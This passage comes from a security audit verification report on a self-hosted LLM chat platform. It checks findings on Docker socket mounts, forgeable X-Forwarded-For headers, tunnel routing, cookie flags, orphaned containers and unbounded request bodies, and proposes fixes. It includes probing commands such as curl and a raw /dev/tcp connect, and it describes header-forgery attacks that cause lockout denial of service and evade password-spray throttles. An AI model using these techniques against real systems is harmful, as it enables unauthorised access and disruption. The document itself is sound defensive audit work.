*Verification.* The technical claim is correct and is the kind of thing that is usually wrong, so I checked it carefully. compose/compose.monitoring.yaml:219-225 is `privileged: false` with `- /:/rootfs:ro`, `- /var/run:/var/run:ro`, `- /sys:/sys:ro`, `- /var/lib/docker:/var/lib/docker:ro`, `- /dev/disk:/dev/disk:ro`; `docker inspect sf-local-ai-cadvisor-1` confirms those Binds and `Config.User` is empty, i.e. the process runs as uid 0 inside, which bypasses the srw-rw---- root:docker mode on the socket. An MS_RDONLY bind mount forbids writes to the filesystem; it does not make connect() to a unix socket fail, so the Docker API behind it stays fully mutable — the auditor's core assertion holds. I did not exec into the container to demonstrate it (that would be acting on a production container). Downgraded to P1->P2 because there is no path to exploit it today: it requires code execution inside cadvisor first, and cadvisor is not published (docker ps shows `8080/tcp` with no host mapping) and is not fed attacker-controlled input beyond container labels, which are disabled by `--store_container_labels=false` at :221. Their contrast with the engine-controller is fair — compose/compose.cluster-worker.yaml:166-169 does write the honest version of the same mount.

*Exploitable today.* No. Precondition is prior code execution inside the cadvisor container (an unpatched cadvisor RCE); the image is digest-pinned at :215, so this is a latent privilege-escalation amplifier, not a live hole.

*Fix.* Replace `- /var/run:/var/run:ro` at compose/compose.monitoring.yaml:222 with a read-only docker-socket proxy (e.g. a tecnativa/docker-socket-proxy sidecar permitting GET /containers and /images only) and point cadvisor at it. IMPORTANT correction to the auditor's 'at minimum' option: narrowing the bind to `/var/run/docker.sock:/var/run/docker.sock:ro` removes no privilege at all — it is cosmetic. If a proxy is too much, the honest minimum is a comment recording the accepted risk, as the worker sentinel does.

*Fix risk.* cadvisor container restart, plus a new sidecar service if you take the proxy route. No model restart, no production window. Risk is metric loss: cadvisor degrades to cgroup-only data if the proxy denies an endpoint it needs, so verify the container dashboards after the change.

### F058 — AUTH_TRUST_PROXY_HEADERS is on while the orchestrator is directly reachable on 0.0.0.0:8080, so any LAN host can forge its own client address

**P2** · edge-devops · `compose.yaml:233` · verdict **ADJUSTED** · claimed P1

*Evidence.* compose.yaml:233 publishes the orchestrator at `${TECHSARA_BIND_ADDRESS:-127.0.0.1}:8080` and .env:72 makes that 0.0.0.0 (confirmed by docker inspect: HostIp 0.0.0.0). .env:325 sets `AUTH_TRUST_PROXY_HEADERS=true`. orchestrator/app/config.py:1220-1224 reads it with the comment "X-Forwarded-For / X-Forwarded-Proto are LIES unless a proxy this…", and orchestrator/app/authn/sessions.py:222-228 acts on it: "The direct peer address unless AUTH_TRUST_PROXY_HEADERS opts into X-Forwarded-For — an unauthenticated header is an attacker-controlled" … `forwarded = request.headers.get("x-forwarded-for", "")`. docs/AUTH.md:293-295 justifies the setting on the assumption that requests arrive through the frontend proxy, which is true for tunnel traffic and false for anything hitting 8080 directly.

*Impact.* The trust decision is correct for the tunnel path and wrong for the published port. Any host on the LAN or tailnet can send `X-Forwarded-For: <anything>` straight to 192.168.9.54:8080 and choose the address recorded in the audit log and in the session's client-address binding — so brute-force attempts, lockout counters and audit trails can all be attributed to an arbitrary third party, and per-address defences can be sidestepped by rotating the header. This is a direct blocker for the developer platform: API-key quotas and abuse throttles keyed on client address inherit the same forgeability the moment a request can reach the orchestrator without passing the trusted proxy.

*Verification.* The chain is real and I followed all of it. .env:325 `AUTH_TRUST_PROXY_HEADERS=true`; orchestrator/app/config.py:1220-1224 reads it (default False, with the 'X-Forwarded-For / X-Forwarded-Proto are LIES' comment); orchestrator/app/authn/sessions.py:219-231 `client_meta()` overwrites the peer address with `request.headers.get("x-forwarded-for","").split(",")[0]` when the flag is on; and the consumer is orchestrator/app/authn/api.py:82-104, where `ip_key = f"ip:{ip or 'unknown'}"` is one of the two throttle keys and the same `ip` is written to store.record_audit and sessions.create. The port is open: my POST to http://192.168.9.54:8080/chat returned 401 (processed, then auth-rejected), so the request reaches the handler. Downgraded to P2 because the damage is bounded — the email-keyed throttle (api.py:82, 8 fails / 900 s) is unaffected by header forgery, so this weakens per-address defence and corrupts audit attribution but does not bypass authentication. TWO THINGS THE AUDITOR MISSED, both of which I verified. (1) An impact they did not name: forging `X-Forwarded-For: <a victim's address>` with 8 failed logins locks THAT address out for AUTH_LOGIN_LOCK_SECONDS — an unauthenticated, targeted login denial-of-service, not just log pollution. (2) Port 8080 is not the only door: the frontend is also on 0.0.0.0:3000 and frontend/lib/proxy.ts:34-39 forwards `cf-connecting-ip` (preferred) or `x-forwarded-for` straight through, so a LAN host can forge the same value via the friendlier front door. The public path is genuinely safe, which is why this stays P2: Cloudflare overwrites cf-connecting-ip, and the proxy prefers it.

*Exploitable today.* Yes, from LAN/tailnet position, unauthenticated. Not from the internet — the tunnel path's cf-connecting-ip is set by Cloudflare and preferred by frontend/lib/proxy.ts:38.

*Fix.* Make the trust conditional on the peer rather than global: add a TRUSTED_PROXY_IPS/CIDR setting near orchestrator/app/config.py:1224 and have sessions.py:227 honour x-forwarded-for only when `request.client.host` is inside it (the frontend container's address on the `application` network). Cheaper interim fix that closes both doors at once: drop compose.yaml:233 and compose.yaml:311 from `${TECHSARA_BIND_ADDRESS}` to loopback.

*Fix risk.* Orchestrator (and frontend, if you rebind 3000) container restart; no model restart, no production window. Real regression risk on the cheap fix: taking 3000 off 0.0.0.0 removes LAN access to the app for anyone not on the tunnel or Tailscale — confirm nobody depends on http://192.168.9.54:3000 first. On the code fix, getting the trusted CIDR wrong makes every audit row record the proxy address instead of the user, which is a silent accuracy loss rather than an outage.

### F059 — The public tunnel's ingress is not in version control — the public routing exists only in the Cloudflare dashboard

**P2** · edge-devops · `compose/compose.cloudflare.yaml:33` · verdict **CONFIRMED**

*Evidence.* compose/compose.cloudflare.yaml:33 `command: tunnel --no-autoupdate --metrics 0.0.0.0:20241 run` with only `TUNNEL_TOKEN` at :35 — a token-run tunnel takes its ingress from Cloudflare, not from a local file. The file says so at :98-100 ("Consolidating onto one tunnel later is a dashboard change") and docs/AUTH.md:284-289 documents the hostname mapping as a manual dashboard step. A repo-wide grep for `ingress` / `credentials-file` / a tunnel config.yml returns nothing. The actual live mapping is only observable in the container's log: `ai.techsarasolutions.com -> http://frontend:3000`, catch-all `http_status:404`.

*Impact.* The single most security-relevant piece of routing in the system — what the internet can reach — is not in git, not reviewed, not diffable and not restorable from the repository. A dashboard mis-click that points ai.techsarasolutions.com at `http://vllm:8000` or `http://orchestrator:8080` would publish an unauthenticated model API or the Swagger UI to the internet in seconds with no commit, no CI run and no reviewer. For the developer-platform build this is the mechanism by which api.techsarasolutions.com will be added, so the exposure change that matters most will leave no trace in the repo.

*Verification.* Accurate. compose/compose.cloudflare.yaml:33 is `command: tunnel --no-autoupdate --metrics 0.0.0.0:20241 run` with only `TUNNEL_TOKEN` at :35 — a token-run tunnel takes ingress from Cloudflare. A grep for `ingress:`/`credentials-file`/`--config` across compose/ and scripts/ returns only prometheus and blackbox config files, no tunnel config. The live mapping is only in the log, and it is what they quote: ai.techsarasolutions.com -> http://frontend:3000, catch-all http_status:404. I can strengthen their impact with a fact they did not check: the mis-click is not hypothetical, because cloudflared can actually reach those targets. `docker inspect` shows cloudflared on sf-local-ai_application together with vllm-router, vllm-embed and vllm-reranker (all three are on BOTH application and inference, because compose/compose.published-dgx-spark.yaml attaches `application` when PUBLISH_MODEL_PORTS=true), and the application gateway 172.18.0.1:8000 answers 200 for the main engine. So `http://vllm-router:30002` or `http://172.18.0.1:8000` in a dashboard rule would publish an unauthenticated model API to the internet in seconds — and that directly contradicts compose/compose.cloudflare.yaml:36-37, which asserts the tunnel 'is NOT on inference: the tunnel has no business being able to see the model APIs'.

*Exploitable today.* No — it is not an attacker-reachable flaw. It is an audit and change-control gap whose precondition is a mistake or a compromised Cloudflare account, with no commit, no CI run and no reviewer in the path.

*Fix.* Migrate both tunnels to locally-managed config: create them with a credentials file, commit compose/cloudflared/config.yml with the ingress rules, mount it read-only, and change the command to `tunnel --no-autoupdate --config /etc/cloudflared/config.yml run <tunnel-id>`, leaving only the credentials JSON in .runtime/secrets.env. If that is too large for this programme, their fallback is good: a `scripts/tunnel.sh check` that diffs the live ingress against a committed expected-mapping file and fails CI on drift.

*Fix risk.* Migrating the tunnel to a credentials file means a brief public outage of ai.techsarasolutions.com while cloudflared re-registers — schedule it. No model restart. The check-only fallback has no runtime risk at all and is the right first step.

### F060 — Grafana's session cookie is issued without the Secure flag on a public HTTPS hostname

**P2** · edge-devops · `compose/compose.monitoring.yaml:97` · verdict **CONFIRMED**

*Evidence.* compose/compose.monitoring.yaml:97 `GF_SECURITY_COOKIE_SECURE: ${GRAFANA_COOKIE_SECURE:-false}` and .env:306 `GRAFANA_COOKIE_SECURE=false`, while .env:303 is `GRAFANA_ROOT_URL=https://grafana.techsarasolutions.com` and the second tunnel publishes that hostname (verified in cloudflared-grafana's log). `docker inspect sf-local-ai-grafana-1` confirms the running container has `GF_SECURITY_COOKIE_SECURE=false` together with `GF_SERVER_ROOT_URL=https://grafana.techsarasolutions.com`. This is precisely the mistake docs/AUTH.md:290-293 warns about for the application's own cookie, where AUTH_COOKIE_SECURE is correctly set to true (.env:321).

*Impact.* The Grafana session cookie may be sent over a plaintext connection — the http:// form of the public hostname before Cloudflare's redirect, or the loopback/LAN http://…:3300 origin — so a session that authenticates a dashboard containing full infrastructure telemetry is exposed to any passive observer on those paths. Grafana itself is otherwise sensibly locked down (GF_AUTH_ANONYMOUS_ENABLED=false at :81, GF_USERS_ALLOW_SIGN_UP=false at :80, SameSite=lax at :98), which makes this the one weak link in an otherwise careful configuration.

*Verification.* Confirmed, and the exploit precondition they assumed actually holds — I checked the thing that usually refutes this class. compose/compose.monitoring.yaml:97 `GF_SECURITY_COOKIE_SECURE: ${GRAFANA_COOKIE_SECURE:-false}` and .env:306 `GRAFANA_COOKIE_SECURE=false`, against .env:303 `GRAFANA_ROOT_URL=https://grafana.techsarasolutions.com`. The usual refutation would be 'Cloudflare redirects http to https, so no plaintext request ever carries the cookie' — it does not: `curl -sI http://grafana.techsarasolutions.com/` returns HTTP/1.1 302 with `location: /login` served over plaintext (an origin response proxied by Cloudflare, not an Always-Use-HTTPS 301 to the https scheme), and `curl -sI https://grafana.techsarasolutions.com/login` returns HTTP/2 200 with NO strict-transport-security header. So there is a live plaintext path to that hostname and no HSTS to stop a browser taking it. Their surrounding observation is also right — GF_AUTH_ANONYMOUS_ENABLED=false (:81), GF_USERS_ALLOW_SIGN_UP=false (:80), SameSite lax (:98) — this is the one weak setting in a careful block.

*Exploitable today.* Yes, given an on-path attacker between the Grafana user's browser and the Cloudflare edge (hostile WiFi, ISP, or a forced http:// navigation). No credential needed by the attacker; the victim must have an active Grafana session.

*Fix.* Set `GRAFANA_COOKIE_SECURE=true` in .env:306, and flip the default at compose/compose.monitoring.yaml:97 to `true` so the insecure value must be asked for. Add `Strict-Transport-Security` at the Cloudflare edge for both hostnames while you are there — that is the fix for the class, not just this cookie.

*Fix risk.* Grafana container restart only; no model restart, no production window. The one predictable regression is exactly what the comment at :93-96 warns about: with Secure on, logging in via http://127.0.0.1:3300 will appear to succeed and bounce back to the login page, because the browser drops the cookie. Operators must use the https hostname after this.

### F061 — SearXNG falls back to a hard-coded secret when the generated env is absent

**P2** · edge-devops · `compose.yaml:116` · verdict **CONFIRMED**

*Evidence.* compose.yaml:116 `SEARXNG_SECRET: ${SEARXNG_SECRET:-please-change-me}`. Every other credential in the same file fails closed instead: compose.yaml:30 `POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:?POSTGRES_PASSWORD must be set}` and compose/compose.monitoring.yaml:79 uses `:?` for GRAFANA_ADMIN_PASSWORD. The launcher does generate a real value (launcher/techsara_cli/environment.py:132-141 lists SEARXNG_SECRET among generated_defaults) and the running container has a random one, so this only bites a stack brought up outside the launcher.

*Impact.* A `docker compose -f compose.yaml up` without .runtime/generated.env — a developer reproducing the stack, a rollback, a CI harness — silently starts SearXNG with a publicly known secret used to sign its own state, and nothing reports it. Low impact because SearXNG publishes no port and sits on the internal side of the app network, but it is an inconsistency with the project's own fail-closed convention and the kind of default that gets copied into the next service.

*Verification.* Literally true and correctly scoped by the auditor themselves. compose.yaml:116 is `SEARXNG_SECRET: ${SEARXNG_SECRET:-please-change-me}` while compose.yaml:30 is `POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:?POSTGRES_PASSWORD must be set}` and compose/compose.monitoring.yaml:79 uses `:?` for GRAFANA_ADMIN_PASSWORD — the fail-closed convention exists and this one line breaks it. launcher/techsara_cli/environment.py:135 does list `"SEARXNG_SECRET": 32` in generated_defaults, so the supported path always has a real value. I confirmed the containment too: docker ps shows searxng with `8080/tcp` and no host mapping, and it sits only on the `application` network, so there is no external surface even when the weak secret is in force.

*Exploitable today.* No. It bites only a stack brought up without .runtime/generated.env (a developer repro, a rollback, a CI harness), and even then the service is unpublished and internal-only.

*Fix.* One line: change compose.yaml:116 to `${SEARXNG_SECRET:?SEARXNG_SECRET must be set — ./techsara up generates one into .runtime/secrets.env}`.

*Fix risk.* Essentially none on the supported path, since the launcher already supplies the value. It will newly break any ad-hoc `docker compose -f compose.yaml up` that skipped the launcher — which is the intended behaviour. No restart of anything running; the change takes effect on the next recreate.

### F062 — An unmanaged container is holding the application data volume open

**P2** · edge-devops · `compose.yaml:371` · verdict **CONFIRMED**

*Evidence.* `docker ps` shows `zealous_williamson  alpine  Up 47 hours` with no ports. `docker inspect zealous_williamson` gives `Net=bridge Priv=false Binds=["sf-local-ai_data:/volume"]` — it has the `data` volume (compose.yaml:371) mounted at /volume. No compose file in the repo defines it; the auto-generated name means it was started by hand with `docker run`.

*Impact.* A hand-started container has had read access (and, since no :ro flag is present, write access) to the volume holding /data — the DuckDB warehouse, the LanceDB index, parquet exports, uploaded files and the Salesforce JWT key — for two days. It is invisible to `techsara up`, to the deploy pipeline and to the monitoring stack, nothing will restart or update it, and nobody reviewing the repo would know it exists. Whatever it was for, it is now an untracked write handle on production data.

*Verification.* Verified directly: `docker inspect zealous_williamson` gives Image=alpine, Cmd=["sh"], Binds=["sf-local-ai_data:/volume"], StartedAt 2026-09-10T18:25:21Z — running roughly two days, with no `:ro`, so the mount is read-write. compose.yaml:370-371 confirms `data: name: sf-local-ai_data` is the application data volume (the DuckDB warehouse, LanceDB, parquet, uploads and /data/sf_jwt_key.pem per the orchestrator's volume and SF_PRIVATE_KEY_FILE at compose.yaml:167), and `docker volume ls` confirms the name. The auto-generated name means `docker run` by hand; nothing in the repo references it. Note this is not the only such container — see the litellm-dgx item in my missed list.

*Exploitable today.* No, not as a remote flaw — it has no ports and nothing reaches it. It is an untracked, unreviewed write handle on production data held by an interactive shell container of unknown provenance.

*Fix.* Find out who started it (check shell history / ask the team) and `docker rm -f zealous_williamson`. Then add the check the auditor proposes to scripts/deploy-preflight.sh: list containers mounting `sf-local-ai_*` volumes whose `com.docker.compose.project` label is not `sf-local-ai`, mirroring what cli.py:1856-1875 already does for the superseded docker-compose.yml.

*Fix risk.* Removing an idle alpine `sh` with no ports cannot affect the stack — no restart, no model restart, no production window. The only risk is destroying evidence or someone's in-flight manual work, so look at it before you remove it.

### F063 — The cluster's torch-distributed master port and an iperf3 server listen on all interfaces

**P2** · edge-devops · `scripts/lib/cluster-common.sh:86` · verdict **ADJUSTED**

*Evidence.* `ss -ltn` shows `*:29501` and `*:5201` — both wildcard, both confirmed reachable from the host's LAN address by a raw TCP connect (`exec 3<>/dev/tcp/192.168.9.54/29501` and `/5201` both succeeded). 29501 is the cluster master port: scripts/lib/cluster-common.sh:86 `CLUSTER_MASTER_PORT="${CLUSTER_MASTER_PORT:-29501}"` and .runtime/generated.env:30 `CLUSTER_MASTER_PORT=29501`; compose/compose.cluster-dgx-spark.yaml:49-53 passes the master address to the engine over the RoCE link, so only the worker should ever dial it.

*Impact.* The torch.distributed / vLLM message-queue rendezvous port is open to the office LAN and the tailnet rather than to the RoCE rail it was designed for. At minimum a LAN host can connect to the rendezvous and disrupt or wedge a two-node engine that the availability programme exists to keep up; torch's distributed store is not a hardened listener and has historically been a deserialisation risk. 5201 is iperf3's default port and looks like a leftover from the fabric benchmarking documented in the cluster notes — an open bandwidth-test server on a production GPU box.

*Verification.* Both listeners verified independently of the auditor: `ss -ltn` shows `*:29501` and `*:5201`, and raw TCP connects succeeded from the LAN address (192.168.9.54) and — which they did not test — from the tailnet address 100.94.16.2 for 29501. The iperf3 half is fully pinned down: scanning /proc found pid 2308 `/usr/bin/iperf3 --server --interval 0`, and a grep for 'iperf' across every .sh/.py/.yaml in the worktree returns nothing, so it is a hand-started leftover exactly as they say. The 29501 attribution is right too (scripts/lib/cluster-common.sh:86, and the engine's own argv carries `--master-port 29501`). I hold it at P2 rather than P1 because the 'wedge the engine' impact is reasoned, not demonstrated, and I would not test it on the production pair. THE AUDITOR'S FIX FOR 29501 IS WRONG and would waste a maintenance window: they suggest confirming the engine gets a rail-scoped master address, but it already does — `docker inspect sf-local-ai-vllm-1` shows `--master-addr 10.100.184.1` (the RoCE address) AND ss still shows the listener on `*`. torch's TCPStore binds the wildcard regardless of the advertised master address, so no vLLM flag closes this.

*Exploitable today.* Yes to the extent of connecting: any LAN or tailnet host can open a TCP session to both ports unauthenticated. Turning a 29501 connection into engine disruption is plausible (torch's distributed store is not a hardened listener) but unproven here; 5201 is simply a free bandwidth-test server on a production GPU box.

*Fix.* 5201: kill pid 2308 (`kill 2308`) and remove whatever starts it. 29501: since no engine flag will rebind it, contain it at the network layer — a default-deny INPUT policy allowing the RoCE rails (10.100.184.0/24, 10.100.185.0/24) and the tailnet, or a targeted `iptables -A INPUT -p tcp --dport 29501 ! -s 10.100.184.0/24 -j DROP`. Add a `ss -ltn` assertion to scripts/cluster-doctor.sh that fails when 29501 is on `*` so the state is at least visible.

*Fix risk.* Killing iperf3 is free — nothing depends on it, no restart. The firewall work is where the care is needed: 29501 carries live inter-rank traffic, so a mistyped rule severs the TP=2 pair and takes chat down. Stage the rules with a timed rollback and verify with scripts/cluster-verify-engine.sh. Also note for the auditor's broader 'just turn on ufw' suggestion: ufw will NOT contain the Docker-PUBLISHED ports (3000, 8080, 9000) because Docker's DNAT is evaluated before ufw's INPUT chain — those need DOCKER-USER rules. It will contain the host-network listeners (8000, 9100, 9838, 29501, 5201).

### N018 — A second unmanaged container, litellm-dgx, is already an OpenAI gateway in front of the main model, with its master key world-readable

**P2** · edge-devops · `compose.yaml:371` · verdict **FOUND IN VERIFICATION**

*Evidence.* `docker ps` shows `litellm-dgx docker.litellm.ai/berriai/litellm:main-latest 127.0.0.1:4000->4000/tcp`, started 2026-09-10T20:47:47Z, mounting /home/techsphere/litellm-dgx/config.yaml. That file reads: `model_list: - model_name: Qwen3.6-35B-A3B-NVFP4 / litellm_params: model: openai/Qwen/Qwen3.6-35B-A3B-NVFP4 / api_base: http://host.docker.internal:8000/v1 / api_key: local-no-key` and `general_settings: master_key: sk-dgx-<redacted>`. `ls -la` gives mode -rw-rw-r-- on the config and drwxrwxr-x on its directory — world-readable — whereas every first-party secret file is 0600 (.env, .runtime/secrets.env and .runtime/controller.env all verified -rw-------). A grep for 'litellm' across the worktree returns nothing: it is in no compose file, no script and no deploy path. The first pass found zealous_williamson (F062) and portainer (F052) but missed this one.

*Impact.* This is already the shape of the thing the developer platform is about to build — an API-key-gated OpenAI gateway in front of Qwen3.6-35B — running outside the repository, outside `techsara up`, outside the deploy pipeline and outside monitoring, on an unpinned `:main-latest` tag. Three consequences. Any local account on this box can read its master key from a world-readable file. It is one flag (`-p 0.0.0.0:4000`) or one tunnel ingress rule from being a public, unmetered, unlogged gateway to the flagship model that no audit log or analytics console will ever see. And it depends on the very misconfiguration in F050 — it dials host.docker.internal:8000 — so fixing F050 will silently break it, and whoever relies on it may 'fix' that by reopening the bind.

*Fix.* Decide whether it stays. If it does not, `docker rm -f litellm-dgx` and delete the config. If it does, bring it into the repo as a compose service bound to `${TECHSARA_MODEL_BIND_ADDRESS:-127.0.0.1}`, move master_key into .runtime/secrets.env, chmod 600 the config, pin the image by digest like every other service here, and point api_base at the bridge gateway so the F050 fix does not break it. Either way, add the orphan-container check proposed in F062 and widen it from 'holds an sf-local-ai_* volume' to 'publishes a port or talks to the engine but carries no com.docker.compose.project=sf-local-ai label' — that one check would have caught all three of portainer, zealous_williamson and litellm-dgx.

### N019 — The public login page and the login API are served over plaintext HTTP with no HSTS

**P2** · edge-devops · `.env:321` · verdict **FOUND IN VERIFICATION**

*Evidence.* `curl -s -o /dev/null -w '%{http_code} %{size_download}' http://ai.techsarasolutions.com/login` returns `200 12593` — the full login page over plaintext — and `curl -X POST http://ai.techsarasolutions.com/api/auth/login -d '{"email":...,"password":...}'` returns 401, i.e. the credential POST is accepted and processed over http. `curl -sI https://ai.techsarasolutions.com/` returns HTTP/2 307 with NO strict-transport-security header (I grepped for it). The same is true of grafana.techsarasolutions.com (F060). The application's own cookie hygiene is correct — .env:321 AUTH_COOKIE_SECURE=true, and docs/AUTH.md:290-293 explains why 'auto' is wrong here — which is exactly why this gap is easy to miss: the cookie is protected, the password is not.

*Impact.* Any on-path attacker between an employee and the Cloudflare edge — hostile WiFi, a compromised home router, a hostile ISP — can serve or observe the plaintext login page and capture the email and password as typed. The Secure cookie flag prevents session-cookie theft but does nothing for the credential itself, and without HSTS a browser that has previously used the site will still follow an http:// link or a downgrade. This is the single most valuable credential in the system: the owner account is the adopted legacy account with super-admin rights over /admin/api/members/{user_id}/reset-password and the analytics export. F060 spotted the symptom on the Grafana hostname and treated it as a cookie-flag problem; the underlying condition is that neither public hostname enforces TLS, and the ap

*Fix.* Two settings at the Cloudflare edge, no code change and no restart: turn on 'Always Use HTTPS' for both hostnames so http:// is answered with a 301 rather than proxied to the origin, and enable HSTS (start with a short max-age, then raise it once you are confident, and only then consider includeSubDomains). Verify with `curl -sI http://ai.techsarasolutions.com/login` returning a 301 to https and `curl -sI https://ai.techsarasolutions.com/` carrying strict-transport-security. Do this before api.techsarasolutions.com exists, so the developer platform's API keys are never transmitted in the clear.

### N020 — The whole application is published on 0.0.0.0:3000, so every Cloudflare edge control is one hop away from being bypassed

**P2** · edge-devops · `compose.yaml:311` · verdict **FOUND IN VERIFICATION**

*Evidence.* compose.yaml:311 publishes the frontend at `"${TECHSARA_BIND_ADDRESS:-127.0.0.1}:${FRONTEND_PORT:-3000}:3000"` and .env:72 makes that 0.0.0.0; `docker ps` confirms `0.0.0.0:3000->3000/tcp`, and ss confirms the listener. Every /api/* route handler under frontend/app/api (30 of them, including auth/login, admin/[...path], upload and chat) is therefore reachable from the LAN and the tailnet without traversing the tunnel. frontend/lib/proxy.ts:34-39 then forwards a caller-supplied `cf-connecting-ip` (preferred) or `x-forwarded-for` upstream, which the orchestrator trusts because .env:325 sets AUTH_TRUST_PROXY_HEADERS=true. The first pass found the orchestrator's own 8080 (F058) and stopped there.

*Impact.* Any protection that lives at the Cloudflare edge — rate limiting, WAF rules, bot management, Cloudflare Access, the 100 MB upload wall — is bypassed by addressing 192.168.9.54:3000 instead of ai.techsarasolutions.com. For the developer platform this is structural: if API-key quotas, abuse throttles or IP reputation are enforced at the edge, or keyed on a client address the edge supplies, they are advisory the moment a request can reach the origin directly. It is also the second door for the F058 header forgery, and unlike port 8080 this one is a normal, friendly HTTP app that anyone on the office network will find by accident.

*Fix.* Decide deliberately whether LAN access to the app is wanted. If it is not, set compose.yaml:311 to loopback (or a Tailscale-only address) and reach the app over the tunnel. If it is wanted, treat the origin as internet-facing: enforce quotas and throttles in the orchestrator rather than at the edge, and pair it with the trusted-proxy CIDR fix from F058 so a directly-delivered request cannot choose its own client address. Either way, write the decision down next to compose.yaml:311 — the file currently documents the model-port bind decision carefully and says nothing about this one.

### F001 — Request bodies are buffered whole in the Next process before any authentication, with no size limit anywhere

**P2** · frontend-app · `frontend/app/api/chat/route.ts:238` · verdict **ADJUSTED** · claimed P1 · blocks release

*Evidence.* export async function POST(req: Request): Promise<Response> {
  const startedAt = Date.now();
  let body: ChatRequestBody;
  try {
    body = (await req.json()) as ChatRequestBody;   // ← line 238, first statement, no auth, no cap

and the same pattern in the shared helper, frontend/lib/proxy.ts:50-53:
      body:
        req.method === 'GET' || req.method === 'HEAD'
          ? undefined
          : await req.text(),

Next 16 documents a default body cap only for Server Actions (1MB) and the middleware/proxy buffer (10MB) — node_modules/next/dist/docs/01-app/02-guides/server-actions.md:83 and .../proxyClientMaxBodySize.md:9. Route handlers get neither, and the proxy buffer never applies here because middleware.ts:35 excludes /api.

*Impact.* Anyone who can open a TCP connection to the frontend — confirmed reachable on 0.0.0.0:3000 at 192.168.9.54 — can POST an arbitrarily large body to /api/auth/login or /api/chat and the single Node process materializes all of it in memory BEFORE the orchestrator is ever asked for a 401. For /api/chat the cost is worse than 1×: line 238 parses the JSON and line 301 re-serializes it with JSON.stringify, and images/PDFs legitimately travel as base64 inside that body (lib/orchestrator.ts:233), so peak RSS is roughly 3× the request. One unauthenticated request OOMs the container that serves the entire UI. Every /api/auth/*, /api/history/*, /api/admin/* and /api/conversations/*/share request shares the lib/proxy.ts half.

*Verification.* The code is exactly as claimed. /home/techsphere/Documents/project/personal-LLM-Chabot-devapi/frontend/app/api/chat/route.ts:236-239 — `export async function POST(req: Request)` whose first statement is `body = (await req.json()) as ChatRequestBody;` with no Content-Length pre-check, no auth, and the re-serialisation at line 302 `body: JSON.stringify(chatRequest)`. lib/proxy.ts:50-53 is the same shape for every /api/auth/*, /api/history/*, /api/admin/* (non-download) and /api/conversations/*/share request: `body: req.method === 'GET' || req.method === 'HEAD' ? undefined : await req.text()`. There is no bodySizeLimit anywhere — next.config.mjs (read in full) has only `output`, `reactStrictMode`, `poweredByHeader` and `headers()`; no `experimental.serverActions`, no rewrites. The repo's ONLY bounded reader is app/api/artifacts/[[...path]]/route.ts:51-73 `readBounded()` plus the declared-Content-Length 413 at 270-273, and it is used by that one route. Two corrections to the auditor's account. (a) The failure mode is not a clean OOM: V8 caps a string at ~512 MB, so `await req.text()` / `req.json()` throws RangeError on a multi-GB body — and both calls sit INSIDE their try blocks (proxy.ts:45-61 → 502, chat/route.ts:237-245 → 400), so the request is answered rather than crashing the handler. What is real is that undici accumulates the entire body as Buffers BEFORE the decode throws, so RSS still tracks the upload; external Buffer memory is not bounded by the V8 heap, and compose.yaml sets no mem_limit on any service, so the pressure lands on the host. (b) The severity assumes a network position: compose.yaml:311 binds `${TECHSARA_BIND_ADDRESS:-127.0.0.1}` and production has set it to 0.0.0.0 (LISTEN 0.0.0.0:3000 confirmed), so this is unauthenticated from the LAN/tailnet — but from the internet the Cloudflare tunnel's 100 MB edge wall bounds each request, so the internet path needs concurrency rather than one giant POST.

*Exploitable today.* yes — precondition is a LAN/tailnet position (any host that can open TCP to 192.168.9.54:3000). No cookie, no account. From the public internet it is bounded to ~100 MB per request by the Cloudflare edge, so it needs many concurrent requests rather than one.

*Fix.* Promote the bounded reader the repo already has: move `readBounded` out of frontend/app/api/artifacts/[[...path]]/route.ts:51-73 into frontend/lib/proxy.ts as `readBoundedBody`, and in `proxyToOrchestrator` replace `await req.text()` with the declared-Content-Length 413 pre-check (artifacts route:270-273) plus a bounded read at a JSON-sized default (64 KB covers every /auth, /history, /admin and /share body). Give app/api/chat/route.ts its own larger cap derived from the composer's base64 image budget, applied before line 238. Leave /api/upload, /api/upload/chunked and /api/audio/transcribe on `body: req.body`.

*Fix risk.* Low. The risk is picking a /api/chat cap below a legitimate base64 image or PDF payload and turning a working send into a 413 — size it from lib/orchestrator.ts's image budget and test with the largest allowed attachment. Frontend image rebuild + `docker compose up -d frontend` only; the orchestrator and the vLLM pair are untouched, so no model restart and no production window.

### F002 — The BFF launders a client-supplied Cf-Connecting-IP into a trusted X-Forwarded-For, forging audit IPs and evading the per-IP login lockout

**P2** · frontend-app · `frontend/lib/proxy.ts:37` · verdict **ADJUSTED** · claimed P1 · blocks release

*Evidence.* const forwardedFor =
    req.headers.get('cf-connecting-ip') ?? req.headers.get('x-forwarded-for');
  if (forwardedFor) headers['x-forwarded-for'] = forwardedFor;

The orchestrator believes it, because AUTH_TRUST_PROXY_HEADERS is on in production (docker inspect sf-local-ai-orchestrator-1 → AUTH_TRUST_PROXY_HEADERS=true):

orchestrator/app/authn/sessions.py:226-230
    ip = request.client.host if request.client else ""
    if settings.auth_trust_proxy_headers:
        forwarded = request.headers.get("x-forwarded-for", "")
        if forwarded:
            ip = forwarded.split(",")[0].strip()

and that ip is the throttle key — orchestrator/app/authn/api.py:81-87
    email_key = f"email:{body.email.strip().lower()}"
    ip_key = f"ip:{ip or 'unknown'}"
    for key in (email_key, ip_key):
        if store.throttle_check(key) is not None:
            raise HTTPException(status_code=429, ...)

*Impact.* `cf-connecting-ip` is trustworthy only when Cloudflare set it — Cloudflare overwrites the header on requests it proxies. The frontend is NOT only reachable through the tunnel: it listens on 0.0.0.0:3000 (verified, 192.168.9.54). A caller on that path controls the header completely, and the proxy PREFERS it over x-forwarded-for. Consequence one: every session row and every audit event records an attacker-chosen address, so the audit trail — the thing an enterprise auth retrofit exists to produce — can be written to say anything. Consequence two: the per-IP login lockout never fires, because each attempt looks like a fresh IP; only the per-email lock remains, so an attacker can spray one password across the whole member roster without ever being throttled.

